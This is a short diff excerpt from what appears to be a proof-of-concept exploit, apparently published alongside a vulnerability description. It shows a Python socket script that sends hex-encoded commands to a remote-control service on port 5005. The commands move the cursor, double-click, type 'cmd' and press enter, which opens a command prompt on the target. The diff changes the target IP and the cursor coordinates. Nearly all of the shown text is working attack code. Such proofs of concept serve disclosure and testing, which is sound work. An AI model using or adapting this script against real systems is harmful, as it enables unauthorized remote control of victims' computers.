@@ -25,11 +25,11 @@ Using this flaw, an attacker can:
 import socket
 import time
 
-target_ip = "192.168.1.107"
+target_ip = "192.168.1.109"
 target_port = 5005
 
 messages = [
-    "6D6F76653A2D35352C31303530",  # move:-55,1050
+    "6d6f76653a2d393939392c39393939",  # move:-9999,9999
     "646F75626C655F636C69636B",     # double_click
     "746578743A636D64",             # text:cmd
     "6B65793A656E746572",           # key:enter
